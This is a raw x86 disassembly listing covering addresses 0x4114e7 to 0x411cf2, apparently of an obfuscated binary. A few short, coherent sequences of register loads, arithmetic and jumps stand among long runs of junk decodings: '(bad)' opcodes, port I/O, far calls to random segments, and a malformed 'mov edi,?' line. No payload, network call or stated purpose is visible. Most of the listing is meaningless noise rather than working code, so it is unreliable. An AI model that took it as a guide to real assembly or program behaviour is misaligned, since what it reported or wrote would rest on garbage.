  4114e7:	xor    BYTE PTR [ecx+0x54a583c8],ch
  4114ed:	xor    ecx,DWORD PTR [ebx+0x5d8bf87d]
  4114f3:	lock sub ebx,edi
  4114f6:	cmp    ebx,edx
  4114f8:	ja     0x41178e
  4114fe:	jmp    0x411786
  411503:	(bad)  
  411504:	rol    edi,cl
  411506:	(bad)
  411509:	(bad)
  41150c:	xor    bl,BYTE PTR [edi+0x4e]
  41150f:	shr    BYTE PTR [ecx-0x53],cl
  411512:	cs mov edi,0xe578785d
  411518:	jle    0x411592
  41151a:	js     0x411501
  41151c:	push   edi
  41151d:	xchg   ebp,eax
  41151f:	xlat   BYTE PTR ds:[ebx]
  411520:	mov    cl,0x77
  411522:	stc    
  411523:	fstp   QWORD PTR [edi-0x63]
  411526:	lds    esi,FWORD PTR [eax]
  411528:	pop    ss
  411529:	pop    edi
  41152a:	in     al,dx
  41152b:	xchg   ebp,eax
  41152c:	aaa    
  41152d:	jo     0x41150e
  41152f:	mov    al,0x97
  411531:	pop    esi
  411532:	frstor [ebx-0x32]
  411535:	add    eax,DWORD PTR [edx-0x48]
  411538:	pop    eax
  411539:	pop    edi
  41153a:	int    0xfa
  41153c:	out    dx,al
  41153d:	popf   
  41153e:	rcl    ah,cl
  411540:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411541:	mov    esi,0xf2696533
  411546:	pop    eax
  411547:	jns    0x411510
  411549:	sub    ebx,DWORD PTR [eax]
  41154b:	mov    ebp,DWORD PTR [esi+0x575fc7bf]
  411551:	fisttp WORD PTR [esi]
  411553:	arpl   si,dx
  411555:	and    BYTE PTR [ebx+esi*2+0xb9b38dd],al
  41155c:	sub    bl,0x45
  41155f:	sti    
  411560:	das    
  411561:	or     eax,0x5c826974
  411566:	mov    bh,0x44
  411568:	xor    edi,DWORD PTR [eax+eiz*1-0x4a]
  41156c:	daa    
  41156d:	clc    
  41156e:	imul   eax,DWORD PTR [esi-0x48eefd5b],0xe6c2c331
  411578:	hlt    
  411579:	scas   eax,DWORD PTR es:[edi]
  41157a:	je     0x4115f5
  41157c:	fs ins DWORD PTR es:[edi],dx
  41157e:	bnd ret 
  411580:	pop    es
  411581:	in     al,dx
  411582:	mov    bh,0xd4
  411584:	cli    
  411585:	aas    
  411586:	(bad)  
  411587:	clc    
  411588:	aas    
  411589:	out    0x11,al
  41158b:	jbe    0x411536
  41158d:	push   ss
  41158e:	daa    
  41158f:	and    al,BYTE PTR [esi+0x6d63676e]
  411595:	int    0xc1
  411597:	sbb    ah,BYTE PTR [ecx]
  411599:	adc    ebx,DWORD PTR [edi+0x39b2d9f9]
  41159f:	bound  ecx,QWORD PTR [eax]
  4115a1:	inc    edx
  4115a2:	push   edx
  4115a3:	and    cl,BYTE PTR [ecx]
  4115a5:	out    0x6d,eax
  4115a7:	inc    ebp
  4115a8:	xlat   BYTE PTR ds:[ebx]
  4115a9:	data16 sahf 
  4115ab:	loopne 0x411612
  4115ad:	xor    DWORD PTR ds:0x98f49b85,0x38
  4115b4:	ret    
  4115b5:	jae    0x4115c5
  4115b7:	xchg   ebx,eax
  4115b8:	mov    al,0x6c
  4115ba:	retf   0x8607
  4115bd:	fs pushf 
  4115bf:	outs   dx,BYTE PTR ds:[esi]
  4115c0:	push   0xffffffb0
  4115c2:	push   ebp
  4115c3:	les    edx,FWORD PTR ds:0x2a54775e
  4115c9:	xor    eax,ebp
  4115cb:	pop    edi
  4115cc:	sbb    ecx,DWORD PTR [edx+eax*8]
  4115cf:	out    0x52,eax
  4115d1:	jge    0x411642
  4115d3:	(bad)  
  4115d4:	out    dx,eax
  4115d5:	sahf   
  4115d6:	pop    edi
  4115d7:	mov    al,0x93
  4115d9:	lock test eax,0x140e764a
  4115df:	inc    ebp
  4115e0:	pxor   mm5,QWORD PTR [edi]
  4115e3:	jle    0x411662
  4115e5:	mov    ch,0x9e
  4115e7:	xor    eax,0x96514518
  4115ec:	xchg   ebp,eax
  4115ed:	frstor [edx-0x2e]
  4115f0:	cmp    ebp,ebp
  4115f2:	ret    0x27bc
  4115f5:	or     edx,DWORD PTR [ebx-0x1efe2425]
  4115fb:	adc    eax,0x2a8e29a3
  411600:	sub    al,0x63
  411602:	dec    edi
  411603:	push   0x48
  411605:	imul   esi,DWORD PTR [ecx-0x31],0x439fb8d1
  41160c:	js     0x4115ca
  41160e:	push   ebp
  41160f:	sub    ch,al
  411611:	xor    edi,DWORD PTR [ecx+0x51bffff8]
  411617:	cli    
  411618:	jb     0x4115a1
  41161a:	fsubr  QWORD PTR [eax+0x501f1259]
  411620:	shl    BYTE PTR [eax],cl
  411622:	inc    ebp
  411623:	enter  0xfefa,0x6c
  411627:	es popa 
  411629:	(bad)  
  41162a:	push   cs
  41162b:	jl     0x411607
  41162d:	add    DWORD PTR [esi-0x16],0xb2cffe29
  411634:	inc    edx
  411635:	jl     0x411680
  411637:	ret    0xea6a
  41163a:	call   0xaf96:0x36367536
  411641:	inc    esi
  411642:	loope  0x41165f
  411644:	xor    DWORD PTR [edi+0x48],edx
  411647:	pop    esi
  411648:	xor    BYTE PTR [esi+0x79563b5],bh
  41164e:	sub    edx,ebx
  411650:	fcomip st,st(6)
  411652:	push   cs
  411653:	sti    
  411654:	push   es
  411655:	jbe    0x411665
  411657:	xor    bl,bl
  411659:	iret   
  41165a:	mov    bl,0x7
  41165c:	or     dh,BYTE PTR [ecx+0x34e904e3]
  411662:	and    al,0x57
  411664:	arpl   WORD PTR [ecx],sp
  411666:	fdiv   DWORD PTR ds:0xc0bd8feb
  41166c:	ret    
  41166d:	pop    ebx
  41166e:	mov    edx,DWORD PTR [ebx]
  411670:	and    eax,edi
  411672:	pop    edi
  411673:	outs   dx,DWORD PTR ds:[esi]
  411674:	inc    edi
  411675:	loopne 0x41165a
  411677:	fucomip st,st(2)
  411679:	test   al,0xe8
  41167b:	xchg   DWORD PTR ds:0xc390aef2,ebx
  411681:	pop    ecx
  411682:	call   0x65bd:0x8028bb5e
  411689:	cdq    
  41168a:	lods   al,BYTE PTR ds:[esi]
  41168b:	mov    bl,ch
  41168d:	sub    ebx,DWORD PTR ds:0x592419b3
  411693:	cmp    al,0xa1
  411695:	bound  edi,QWORD PTR [edx]
  411697:	cmp    al,0x35
  411699:	add    edx,DWORD PTR [ecx-0x59]
  41169c:	dec    esp
  41169d:	mov    edi,DWORD PTR [eax-0x559a1378]
  4116a3:	xor    BYTE PTR [esi+0x13],al
  4116a6:	xchg   BYTE PTR [ebx],cl
  4116a8:	xchg   DWORD PTR [esi+0x1c],eax
  4116ab:	xchg   esp,eax
  4116ac:	pop    ss
  4116ad:	shl    DWORD PTR [ecx-0x3c8c9971],0xd
  4116b4:	sub    dl,BYTE PTR [eax+0x6f0f34e7]
  4116ba:	push   0x9d763bdb
  4116bf:	xor    BYTE PTR [esi-0x24a3e24c],ah
  4116c5:	and    al,0x56
  4116c7:	xor    al,0x3a
  4116c9:	dec    ebx
  4116ca:	repz cmp al,0x25
  4116cd:	xchg   edi,eax
  4116ce:	mov    eax,0x220469
  4116d3:	int3   
  4116d4:	xlat   BYTE PTR ds:[ebx]
  4116d5:	cmc    
  4116d6:	data16 mov ds:0x5dd98d66,al
  4116dc:	fwait
  4116dd:	sub    al,0x60
  4116df:	xor    edx,edx
  4116e1:	add    DWORD PTR ds:0x99199372,ebp
  4116e7:	jmp    0x8219d128
  4116ec:	mov    eax,ds:0x178970bd
  4116f1:	jae    0x41176e
  4116f3:	sub    BYTE PTR [edx-0x5f268146],dl
  4116f9:	mov    bh,0x8d
  4116fb:	shl    BYTE PTR [ebx+0x38],cl
  4116fe:	pusha  
  4116ff:	xor    esi,DWORD PTR [eax+edi*8]
  411702:	mov    esp,0x3b44787f
  411707:	inc    ebx
  411708:	mov    cl,0x3b
  41170a:	cdq    
  41170b:	rol    edx,1
  41170d:	sahf   
  41170e:	jecxz  0x41178f
  411710:	add    BYTE PTR [esi],dh
  411712:	fcomp  st(0)
  411714:	stc    
  411715:	jae    0x411699
  411717:	mov    al,0xa6
  411719:	(bad)  
  41171a:	inc    esp
  41171b:	push   0x7b
  41171d:	lahf   
  41171e:	cs stc 
  411720:	(bad)  
  411721:	mov    eax,ebp
  411723:	shr    BYTE PTR [esi-0x559f7052],cl
  411729:	sub    eax,0xeed11ed3
  41172e:	sbb    eax,0x1f7bcaaf
  411733:	mov    bl,0x7c
  411735:	sbb    ah,cl
  411737:	inc    edi
  411738:	adc    al,0x51
  41173a:	or     eax,0xa9e8fcc9
  41173f:	xchg   BYTE PTR [ecx],bl
  411741:	mov    DWORD PTR [ecx+ebx*1-0x76],esi
  411745:	push   es
  411746:	jb     0x41172b
  411748:	enter  0xa590,0x40
  41174c:	fadd   QWORD PTR [ebx+0x1d8fb55e]
  411752:	outs   dx,DWORD PTR ds:[esi]
  411753:	and    edx,DWORD PTR [esp+ebx*4-0x17]
  411757:	adc    eax,0x29346ae2
  41175c:	repz cld 
  41175e:	mul    DWORD PTR [edi]
  411760:	fldl2t 
  411762:	test   al,0x3
  411764:	arpl   WORD PTR cs:[esi+0xc782d7c],bx
  41176b:	sub    DWORD PTR [ecx+0x762aae81],edi
  411771:	sub    eax,0x7f2e8f03
  411776:	jp     0x411704
  411778:	jbe    0x411784
  41177a:	pop    esi
  41177b:	(bad)  
  41177c:	div    BYTE PTR [esi+0x27]
  41177f:	sbb    eax,0xadf96d00
  411784:	mov    gs,eax
  411786:	mov    edx,DWORD PTR [ebp-0x30]
  411789:	jmp    0x411f76
  41178e:	mov    edx,DWORD PTR [ebp-0x38]
  411791:	mov    edi,DWORD PTR [ebp-0x4]
  411794:	xor    edx,eax
  411796:	xor    edi,eax
  411798:	add    edi,ecx
  41179a:	add    edx,ecx
  41179c:	imul   edx,edi
  41179f:	mov    edi,DWORD PTR [ebp-0x8]
  4117a2:	jmp    0x411a2a
  4117a7:	iret   
  4117a8:	leave  
  4117a9:	into   
  4117aa:	xlat   BYTE PTR ds:[ebx]
  4117ab:	fcmovu st,st(3)
  4117ad:	aad    0xc9
  4117af:	cli    
  4117b0:	je     0x411765
  4117b2:	sti    
  4117b3:	xchg   esp,eax
  4117b4:	sub    eax,0x62246458
  4117b9:	js     0x411833
  4117bb:	in     eax,0x7e
  4117bd:	js     0x411837
  4117bf:	dec    ebp
  4117c0:	pop    es
  4117c1:	sbb    al,0x55
  4117c3:	in     eax,dx
  4117c4:	adc    dh,BYTE PTR [esp+edx*4+0x4cea2c0f]
  4117cb:	pop    ebp
  4117cc:	aaa    
  4117cd:	pop    eax
  4117ce:	jns    0x41179a
  4117d0:	iret   
  4117d1:	adc    al,0x25
  4117d3:	pop    ecx
  4117d4:	pop    ds
  4117d5:	sar    DWORD PTR [edi+edi*8+0x71],cl
  4117d9:	xor    BYTE PTR [edx+0x7a82dff5],ch
  4117df:	xchg   esi,eax
  4117e0:	ret    
  4117e1:	popf   
  4117e2:	xor    esp,edx
  4117e4:	xchg   ebx,eax
  4117e5:	lea    ebx,ds:[edi-0x2d9913f4]
  4117ec:	retf   0xb5fa
  4117ef:	add    eax,esp
  4117f1:	xchg   edi,eax
  4117f2:	xchg   DWORD PTR [edx],esi
  4117f4:	add    ecx,DWORD PTR cs:[eax-0x258f99a7]
  4117fb:	mov    al,0x8f
  4117fd:	pop    esp
  4117fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4117ff:	lock cmp ah,ah
  411802:	in     al,dx
  411803:	and    eax,0x287c661a
  411808:	hlt    
  411809:	ja     0x411790
  41180b:	sub    ah,BYTE PTR [ecx]
  41180d:	jmp    0x411793
  41180f:	pop    ebp
  411810:	pushf  
  411811:	test   al,0x4f
  411813:	pushf  
  411814:	popa   
  411815:	cs mov ah,0x9d
  411818:	aas    
  411819:	jae    0x411823
  41181b:	dec    edi
  41181c:	push   esp
  41181d:	cmp    bl,bh
  41181f:	mov    ecx,0x36ba4596
  411824:	inc    eax
  411825:	std    
  411826:	mov    bh,0xe4
  411828:	popf   
  411829:	add    eax,0x94053183
  41182e:	ins    DWORD PTR es:[edi],dx
  41182f:	mov    bh,0xce
  411832:	cli    
  411833:	pop    ds
  411834:	jge    0x411839
  411836:	scas   al,BYTE PTR es:[edi]
  411837:	cmp    eax,0x54849da7
  41183c:	lock jl 0x411844
  41183f:	jp     0x41183a
  411841:	sbb    al,0xe3
  411843:	jp     0x411858
  411845:	xchg   esi,eax
  411846:	int3   
  411847:	int3   
  411848:	pop    eax
  411849:	and    al,0x46
  41184b:	rcr    DWORD PTR [edx+0x0],1
  41184e:	xlat   BYTE PTR ds:[ebx]
  41184f:	sub    BYTE PTR [eax+0x4bd0cc8f],al
  411855:	xchg   DWORD PTR [ebx],ecx
  411857:	mov    BYTE PTR [edx+esi*1+0x4c],bl
  41185b:	push   ebx
  41185c:	cmc    
  41185d:	std    
  41185e:	mov    edi,?
  411860:	mov    DWORD PTR [edi-0x5b7b250c],edx
  411866:	mov    BYTE PTR [esi+0x14],0x92
  41186a:	mov    ds:0xe5b79a07,eax
  41186f:	inc    esp
  411870:	(bad)  
  411871:	in     al,dx
  411872:	mov    BYTE PTR [esi+ebx*2],bh
  411875:	jecxz  0x4118d9
  411877:	into   
  411878:	add    ebx,DWORD PTR [eax-0x23e50aee]
  41187e:	int3   
  41187f:	cwde   
  411880:	jmp    0xe88:0x7d0be632
  411887:	mov    WORD PTR [eax+0x5],ds
  41188a:	mov    edx,0x5aef23f6
  41188f:	pop    ecx
  411890:	push   0xe7cbb846
  411895:	mov    gs:0xde9fe847,al
  41189b:	scas   eax,DWORD PTR es:[edi]
  41189c:	mov    cl,0x3e
  41189e:	es pop esi
  4118a0:	sbb    dl,dl
  4118a2:	popa   
  4118a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4118a4:	mul    dl
  4118a6:	(bad)  
  4118a9:	outs   dx,DWORD PTR ds:[esi]
  4118aa:	or     esp,DWORD PTR [eax+edx*4-0x1c]
  4118ae:	jle    0x411857
  4118b0:	pop    esi
  4118b1:	push   edi
  4118b2:	or     BYTE PTR [edx-0x6cf39cf7],dh
  4118b8:	adc    BYTE PTR [esi+0x40],dl
  4118bb:	cmp    BYTE PTR [edx],bl
  4118bd:	iret   
  4118be:	xor    al,0x4b
  4118c0:	add    DWORD PTR [ebx-0x1a],0x3f5852c2
  4118c7:	mov    edi,0x4addc208
  4118cc:	(bad)  
  4118cd:	pop    edi
  4118ce:	adc    BYTE PTR [esi+0x1a],ah
  4118d1:	in     al,dx
  4118d2:	pusha  
  4118d3:	sbb    eax,0xd674b4d1
  4118d8:	outs   dx,DWORD PTR ds:[esi]
  4118d9:	shl    DWORD PTR [esi-0x49],cl
  4118dc:	sub    eax,0x537ef41f
  4118e1:	nop
  4118e2:	mov    ebp,0xc6417675
  4118e7:	jmp    0x9a8dde3a
  4118ec:	dec    esi
  4118ed:	out    dx,al
  4118ee:	in     eax,dx
  4118ef:	imul   esi,esi,0xf479e45b
  4118f5:	out    0x20,eax
  4118f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4118f8:	mov    ebp,0x59b7154c
  4118fd:	popf   
  4118fe:	xor    esi,eax
  411900:	fadd   QWORD PTR [edi+eiz*2+0x1d1a375b]
  411907:	mov    dh,0xee
  411909:	pop    edx
  41190a:	pop    es
  41190b:	int3   
  41190c:	in     al,dx
  41190d:	mov    al,ds:0x7301603e
  411912:	clc    
  411913:	push   eax
  411914:	jmp    0xc066:0xd527248
  41191b:	ss add al,0xd6
  41191e:	adc    BYTE PTR [ecx],al
  411920:	shr    dh,1
  411922:	xor    BYTE PTR [esi],bl
  411924:	cmp    eax,0x14f0727c
  411929:	retf   
  41192a:	inc    ecx
  41192b:	sbb    DWORD PTR [esi],esp
  41192d:	pushf  
  41192e:	jo     0x411977
  411930:	outs   dx,DWORD PTR ds:[esi]
  411931:	push   ecx
  411932:	xchg   ebx,eax
  411933:	or     bl,BYTE PTR [edx-0x2e993beb]
  411939:	push   esp
  41193a:	mov    esp,0x3f5cccf6
  41193f:	enter  0x20c0,0xed
  411943:	inc    ebx
  411944:	loope  0x4118ca
  411946:	outs   dx,BYTE PTR ds:[esi]
  411947:	into   
  411948:	cmp    ebx,edx
  41194a:	pop    edi
  41194b:	or     eax,0x86b34ce
  411950:	call   0x25b1:0x7f18d672
  411957:	sahf   
  411958:	call   esi
  41195a:	fbstp  TBYTE PTR [ecx+0x24]
  41195d:	ud1    esp,DWORD PTR [esi-0x73]
  411961:	pop    ecx
  411962:	cld    
  411963:	push   ebx
  411964:	cs ja  0x41198f
  411967:	mov    ecx,0xfeb825d2
  41196c:	ss jp  0x4119c1
  41196f:	jb     0x4118fd
  411971:	mov    dl,0x9d
  411973:	adc    bh,BYTE PTR [esi+0x1f8fcc67]
  411979:	pop    ds
  41197a:	jns    0x41192b
  41197c:	adc    eax,ecx
  41197e:	es pushf 
  411980:	push   eax
  411981:	js     0x41193e
  411983:	es shl ebx,cl
  411986:	lahf   
  411987:	mov    ds:0x44841234,eax
  41198c:	shl    ebx,cl
  41198e:	add    ecx,DWORD PTR [edx+esi*1]
  411991:	mov    edx,0x9e2d9787
  411996:	call   0x7b983089
  41199b:	jmp    0x21bd:0x3d1165e5
  4119a2:	sar    dl,1
  4119a4:	cmc    
  4119a5:	aas    
  4119a6:	aad    0x7d
  4119a8:	ror    DWORD PTR [esi],1
  4119aa:	scas   al,BYTE PTR es:[edi]
  4119ab:	add    edi,DWORD PTR [edi]
  4119ad:	and    BYTE PTR [ebx],dl
  4119af:	stos   DWORD PTR es:[edi],eax
  4119b0:	rol    cl,0x3d
  4119b3:	ins    DWORD PTR es:[edi],dx
  4119b4:	daa    
  4119b5:	sbb    DWORD PTR [edi],0x90daa929
  4119bb:	and    al,0x49
  4119bd:	punpckhbw mm0,QWORD PTR [ebx-0x69a2400f]
  4119c4:	cmp    eax,0xad2564b6
  4119c9:	(bad)  
  4119ca:	gs inc edi
  4119cc:	sub    bh,bl
  4119ce:	cmc    
  4119cf:	in     eax,dx
  4119d0:	sbb    eax,0x9b0fc600
  4119d5:	add    eax,0x2e6ad162
  4119da:	add    bh,BYTE PTR [esi-0x3b]
  4119dd:	cmp    eax,0xefa42152
  4119e2:	lods   al,BYTE PTR ds:[esi]
  4119e3:	outs   dx,DWORD PTR ds:[esi]
  4119e4:	(bad)  
  4119e5:	lea    eax,[ebx+0x37]
  4119e8:	jno    0x41196e
  4119ea:	and    eax,0x338be792
  4119ef:	aas    
  4119f0:	mov    dl,BYTE PTR [edx+0xfd50735]
  4119f6:	inc    ebx
  4119f7:	lods   al,BYTE PTR ds:[esi]
  4119f8:	shl    BYTE PTR [bx+di+0x9],0x3
  4119fd:	(bad)  
  4119ff:	fimul  DWORD PTR [ebx]
  411a01:	aam    0xa3
  411a03:	rcl    BYTE PTR [ecx+0x58],cl
  411a06:	shr    DWORD PTR [esi-0x2b],cl
  411a09:	enter  0x8239,0x2e
  411a0d:	lahf   
  411a0e:	(bad)  
  411a0f:	fidiv  DWORD PTR [edi+ecx*8]
  411a12:	and    cl,al
  411a14:	mov    eax,ds:0x250ba355
  411a19:	ja     0x4119d6
  411a1b:	cmp    DWORD PTR [ecx],0xfffffffd
  411a1e:	jmp    0xf029:0xcc9841fc
  411a25:	int    0x66
  411a27:	and    DWORD PTR [esi-0x19],eax
  411a2a:	mov    ebx,DWORD PTR [ebp-0x10]
  411a2d:	sub    ebx,edi
  411a2f:	cmp    ebx,edx
  411a31:	ja     0x411a3f
  411a37:	mov    edx,DWORD PTR [ebp-0x34]
  411a3a:	jmp    0x411f76
  411a3f:	mov    edx,DWORD PTR [ebp-0x3c]
  411a42:	mov    edi,DWORD PTR [ebp-0x4]
  411a45:	xor    edx,eax
  411a47:	xor    edi,eax
  411a49:	add    edx,ecx
  411a4b:	add    edi,ecx
  411a4d:	imul   edx,edi
  411a50:	jmp    0x411cd8
  411a55:	into   
  411a56:	(bad)  
  411a57:	cmp    al,0xc7
  411a59:	fxch   st(3)
  411a5b:	(bad)  
  411a5d:	sub    eax,0x6ad7da8b
  411a62:	(bad)  
  411a63:	ficom  WORD PTR [ecx+0x78786091]
  411a69:	in     eax,0x7e
  411a6b:	js     0x411ae5
  411a6d:	pop    ds
  411a6e:	pusha  
  411a6f:	push   ss
  411a70:	ss and al,0x90
  411a73:	scas   eax,DWORD PTR es:[edi]
  411a74:	retf   0x855d
  411a77:	push   cs
  411a78:	mov    DWORD PTR ds:0xddb926e4,edx
  411a7e:	icebp  
  411a7f:	std    
  411a80:	imul   edx,DWORD PTR fs:[eax],0x6409ea45
  411a87:	dec    ebx
  411a88:	into   
  411a89:	add    BYTE PTR ds:0xa0bbae65,bh
  411a8f:	push   cs
  411a90:	out    dx,al
  411a91:	or     cl,bl
  411a93:	dec    DWORD PTR [ebx]
  411a95:	fnstenv [ebp+0x1]
  411a98:	lods   al,BYTE PTR ds:[esi]
  411a99:	in     al,dx
  411a9a:	pop    ebx
  411a9b:	into   
  411a9c:	(bad)  
  411a9d:	and    al,BYTE PTR [edx+0x7c]
  411aa0:	mov    BYTE PTR [edx-0x4c],ch
  411aa3:	ss stos BYTE PTR es:[edi],al
  411aa5:	in     eax,dx
  411aa6:	loopne 0x411ab4
  411aa8:	xor    ebp,DWORD PTR [esi-0x582b3639]
  411aae:	and    DWORD PTR cs:[ebp+eiz*2+0x3d6bd9fb],0xf386d50
  411aba:	inc    esi
  411abb:	push   esp
  411abc:	inc    edx
  411abd:	aad    0xbe
  411abf:	push   ebx
  411ac0:	xor    eax,0xf82807e1
  411ac5:	xor    ch,al
  411ac7:	ja     0x411aa5
  411ac9:	pop    ecx
  411aca:	cmp    eax,0xdcdf0e3a
  411acf:	xchg   ecx,eax
  411ad0:	lahf   
  411ad1:	and    al,0xc7
  411ad3:	add    esi,DWORD PTR ds:0x63e5e8cd
  411ad9:	test   al,0x59
  411adb:	adc    ebx,DWORD PTR [ecx+ebx*4-0x33c05d2b]
  411ae2:	(bad)  [eax-0x19915f90]
  411ae8:	adc    ecx,DWORD PTR [ecx+0x7b]
  411aeb:	inc    ebp
  411aec:	and    DWORD PTR [ebp-0x2f1e3ed3],ebp
  411af2:	mov    bl,BYTE PTR [esi+0x36]
  411af5:	stos   DWORD PTR es:[edi],eax
  411af6:	jecxz  0x411b0c
  411af8:	jne    0x411a9c
  411afa:	mov    dh,0xd1
  411afc:	fistp  DWORD PTR [ecx+0x33]
  411aff:	inc    ecx
  411b00:	shl    bh,0xa6
  411b03:	push   esi
  411b04:	imul   ebx,ebp,0x60
  411b07:	adc    edx,edi
  411b09:	mov    ebp,0xc36f8d02
  411b0e:	das    
  411b0f:	push   eax
  411b10:	cmp    dh,dl
  411b12:	sbb    eax,0x15d378f8
  411b17:	mov    edx,0x6f51687
  411b1c:	mov    dl,0x44
  411b1e:	jle    0x411b62
  411b20:	pop    edx
  411b21:	mov    eax,ds:0x6e6616d9
  411b26:	xor    eax,0xe3544144
  411b2b:	adc    eax,0xa4f1673e
  411b30:	mov    dh,0xa1
  411b32:	mov    al,ds:0xd0dd4dca
  411b37:	xor    dl,0xea
  411b3a:	add    esp,ebx
  411b3c:	or     eax,0xefe55a91
  411b41:	or     eax,DWORD PTR [esi-0xf]
  411b44:	imul   ecx,esi,0x5a496ca3
  411b4a:	sar    BYTE PTR [esi+0x562d3dca],1
  411b50:	dec    ecx
  411b51:	int    0x2a
  411b53:	jb     0x411b81
  411b55:	add    DWORD PTR [ecx+0x5c],0xd336e6b5
  411b5c:	mov    eax,0xa6320faa
  411b61:	push   edx
  411b62:	jmp    0x4dcd8af3
  411b67:	fldcw  WORD PTR [edi-0x73]
  411b6a:	into   
  411b6b:	or     bl,BYTE PTR [esi]
  411b6d:	sbb    BYTE PTR [ebp+0x4a],0xb4
  411b71:	call   0xe9e0d0cc
  411b76:	sub    al,0xbb
  411b78:	pop    eax
  411b79:	iret   
  411b7a:	xchg   BYTE PTR [esi-0x5107a69f],ah
  411b80:	and    BYTE PTR ds:0x5e959f3,dl
  411b86:	jmp    0x8543:0xb9e60e81
  411b8d:	jl     0x411b27
  411b8f:	ds inc edx
  411b91:	stc    
  411b92:	xchg   edi,eax
  411b93:	ins    DWORD PTR es:[edi],dx
  411b94:	in     al,0xd
  411b96:	hlt    
  411b97:	cli    
  411b98:	dec    edi
  411b99:	jae    0x411ba7
  411b9b:	repz xor DWORD PTR [esi-0x5d],edi
  411b9f:	ins    DWORD PTR es:[edi],dx
  411ba0:	adc    al,0xda
  411ba2:	or     DWORD PTR [ecx],esi
  411ba4:	sbb    BYTE PTR [esi-0x1b512259],0x56
  411bab:	into   
  411bac:	idiv   esi
  411bae:	adc    BYTE PTR [ebx],dh
  411bb0:	rol    DWORD PTR [edx-0x72],cl
  411bb3:	add    ch,BYTE PTR [edx+0x2e10f2f8]
  411bb9:	lock emms 
  411bbc:	jmp    0xd9e01203
  411bc1:	inc    edx
  411bc2:	jb     0x411c12
  411bc4:	mov    esi,0x84db4ca2
  411bc9:	mov    bh,0x7a
  411bcb:	call   esp
  411bcd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411bce:	inc    esi
  411bcf:	rol    DWORD PTR ds:0x38af09f0,1
  411bd5:	(bad)  
  411bd6:	(bad)  
  411bd7:	jg     0x411bc7
  411bd9:	shr    BYTE PTR [ebp-0x390ca766],cl
  411bdf:	jecxz  0x411c05
  411be1:	aam    0x65
  411be3:	push   ecx
  411be4:	ins    DWORD PTR es:[edi],dx
  411be5:	fwait
  411be6:	sbb    dh,cl
  411be8:	aas    
  411be9:	or     ch,BYTE PTR [edi+ebp*4-0x61393239]
  411bf0:	rcl    BYTE PTR [ebx],1
  411bf2:	into   
  411bf3:	inc    esp
  411bf4:	adc    DWORD PTR [edx-0x4fb2a5bd],edi
  411bfa:	outs   dx,DWORD PTR ds:[esi]
  411bfb:	daa    
  411bfc:	(bad)  
  411bfd:	mov    esp,0x5304624d
  411c02:	add    al,0xbb
  411c04:	jmp    0x527fb769
  411c09:	sbb    al,0xb8
  411c0b:	cdq    
  411c0c:	jp     0x411c54
  411c0e:	add    DWORD PTR [esi],ebx
  411c10:	iret   
  411c11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411c12:	icebp  
  411c13:	shl    BYTE PTR [eax],1
  411c15:	(bad)  
  411c16:	ins    DWORD PTR es:[edi],dx
  411c17:	mov    esi,0xe28e90c5
  411c1c:	xchg   ecx,eax
  411c1d:	dec    edx
  411c1e:	or     eax,0x59922dfd
  411c23:	pop    edx
  411c24:	mov    esi,0x31b2d404
  411c29:	cmp    al,0x42
  411c2b:	mov    edx,0x31cfd8a8
  411c30:	push   ebp
  411c31:	push   ds
  411c32:	inc    ebx
  411c33:	sbb    al,0xf
  411c35:	les    esi,FWORD PTR [eax+0x480e75c3]
  411c3b:	mov    dl,0x2d
  411c3d:	rcl    edi,cl
  411c3f:	adc    ebp,ecx
  411c41:	pop    es
  411c42:	xor    bl,dh
  411c44:	es fdivp st(5),st
  411c47:	jle    0x411c16
  411c49:	dec    esi
  411c4a:	jne    0x411bda
  411c4c:	push   esi
  411c4d:	mov    WORD PTR ds:[edi+0x62a03bfe],fs
  411c54:	outs   dx,DWORD PTR ds:[esi]
  411c55:	repnz daa 
  411c57:	xchg   edx,eax
  411c58:	arpl   bp,si
  411c5a:	xor    DWORD PTR [edi-0xa39e39f],0x69
  411c61:	addr16 in al,dx
  411c63:	ficomp DWORD PTR [esi+0x58780194]
  411c69:	mov    BYTE PTR [esi],cl
  411c6b:	aas    
  411c6c:	out    0x5,eax
  411c6e:	scas   al,BYTE PTR es:[edi]
  411c6f:	or     ebx,ebx
  411c71:	or     al,BYTE PTR [ecx+0x46]
  411c74:	and    BYTE PTR [edi-0x326eb504],0x52
  411c7b:	xchg   ebp,eax
  411c7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411c7d:	scas   al,BYTE PTR es:[edi]
  411c7e:	mov    bl,0x6e
  411c80:	jp     0x411c1e
  411c82:	cmp    BYTE PTR [ebx-0x4],0xb6
  411c86:	mov    esp,0xfdede8ef
  411c8b:	jmp    0x411ce6
  411c8d:	sub    DWORD PTR [eax+edx*8-0xe],0xffffffb9
  411c92:	test   ebp,eax
  411c94:	jmp    0x411cda
  411c96:	jge    0x411ca2
  411c98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411c99:	and    eax,0xfef9f61c
  411c9e:	dec    ebp
  411c9f:	ret    0x87c2
  411ca2:	push   0xee52a04c
  411ca7:	and    eax,0xbbf73e3d
  411cac:	shl    DWORD PTR [esi-0x69],cl
  411caf:	(bad)  
  411cb0:	aam    0xa1
  411cb2:	adc    bh,bh
  411cb4:	push   esp
  411cb5:	gs int 0x61
  411cb8:	dec    ebx
  411cb9:	xchg   edi,eax
  411cba:	xchg   ecx,eax
  411cbb:	push   0xffffff8f
  411cbd:	retf   
  411cbe:	into   
  411cbf:	cmp    DWORD PTR [esi-0x30],edx
  411cc2:	sahf   
  411cc3:	lahf   
  411cc4:	push   ebp
  411cc5:	cmp    al,bl
  411cc7:	sbb    al,0x65
  411cc9:	sub    bh,bh
  411ccb:	mov    ch,0x84
  411ccd:	daa    
  411cce:	pop    edi
  411ccf:	not    ebx
  411cd1:	int    0x1b
  411cd3:	sbb    bl,BYTE PTR [ebx-0x76]
  411cd6:	jge    0x411c5f
  411cd8:	mov    edi,DWORD PTR [ebp-0x8]
  411cdb:	mov    ebx,DWORD PTR [ebp-0x10]
  411cde:	sub    ebx,edi
  411ce0:	cmp    ebx,edx
  411ce2:	mov    edx,DWORD PTR [ebp-0x38]
  411ce5:	jbe    0x411f76
  411ceb:	jmp    0x411f73
  411cf0:	rol    al,1
  411cf2:	(bad)  
